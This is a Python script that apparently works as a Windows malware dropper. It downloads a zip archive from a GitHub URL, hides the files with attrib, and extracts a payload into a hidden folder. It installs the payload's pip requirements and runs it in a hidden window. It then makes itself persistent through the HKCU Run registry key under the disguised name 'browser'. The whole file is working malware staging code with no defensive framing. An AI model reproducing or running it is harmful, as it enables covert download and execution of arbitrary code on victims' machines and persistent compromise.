import os,sys,time,subprocess,shutil,requests,random,json,winreg
from zipfile import ZipFile
from getpass import getuser

lodka,matras,stena="I","LOVE","YOU"

url_zip="https://github.com/NukeTim/Kraken/raw/main/drivers2.zip"


def find_python():
    print("find_python")
    python_executable = sys.executable
    python_path = os.path.dirname(python_executable)

    for path in os.environ['PATH'].split(os.pathsep):
        if "python.exe" in path:
            return "python","pip"
            exit()

    
    standart_path="C:/Program files"
    list_path=os.listdir(standart_path)
    for path in list_path:
        if path.lower().startswith("python") or path.lower().startswith("python3"):
            return path
            exit()
    path_2=f"C:/Users/{getuser()}/AppData/Local/Programs"
    list_path=os.listdir(path_2)
    for path in list_path:
        if path.lower().startswith("python"):
            name="python.exe"
            pathwalk=path_2+"/"+path
            for root,dirs,files in os.walk(pathwalk):
                if name in files:
                    python_path=os.path.join(root,name)
                    break
            for root,dirs,files in os.walk(pathwalk):
                if "pip.exe" in files:
                    pip_path=os.path.join(root,"pip.exe")
    return python_path,pip_path

def install_req(pip_path,install_path,req_name):
    print("install_req")
    install_process=subprocess.Popen([f"{pip_path}","install","-r",f"{install_path}/{req_name}"],stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    install_process.communicate()
    

name="archive.zip"
def install_zip(url_zip):
    f=open(f"{name}","wb")
    while True:
        try:
            data=requests.get(url_zip)
            break
        except:
            all
            print("Connection error!")
            time.sleep(3)
    f.write(data.content)
    f.close()
    time.sleep(1)
    attrib=subprocess.Popen(["attrib","+h",f"name"],stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    attrib.communicate()
    with ZipFile(name,"r") as zip:
        zip.extract("kraken_config.json")

def add_startup(install_path,main_file):
    path=f"{install_path}{main_file}".replace("/","\\")
    winreg.CreateKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run")
    registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_WRITE)
    winreg.SetValueEx(registry_key,"browser", 0, winreg.REG_SZ,path)
    winreg.CloseKey(registry_key)
    print("Succeful")
    print(f"{install_path}{main_file}")
    
    


def main(url_zip):
    install_zip(url_zip)
    python_path,pip_path=find_python()
    with open("kraken_config.json","r") as config:
        data_json=json.load(config)
    install_path=data_json["install_path"]
    print(install_path)
    main_file=data_json["main_file"]
    starting_file=data_json["starting_file"]
    startup=data_json["startup"]
    typ=data_json["type"]
    requirements_file=data_json["requirement_file"]
    
    if os.path.exists(install_path)==True:
        None
    else:
        try:
            os.mkdir(install_path)
        except Exception as e:
            if e:
                install_path=f"C:/Users/{getuser()}/{random.randint(55555,1243323)}"
                os.mkdir(install_path)
                
    with ZipFile(name,"r") as zip:
        zip.extractall(install_path)
    os.remove(name)
    os.remove("kraken_config.json")
    
    attrib=subprocess.Popen(["attrib","+h",f"{install_path}"],stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    attrib.communicate()
    
    if typ=="py" and requirements_file!="None":
        print("Download requirements")
        install_req(pip_path,install_path,requirements_file)


    asas=f"{python_path} {install_path}/{main_file}"
    print(asas)
    subprocess.Popen(asas,creationflags=subprocess.CREATE_NO_WINDOW)
    if startup=="True":
        add_startup(install_path,main_file)
        
    


main(url_zip)






                    
            
            

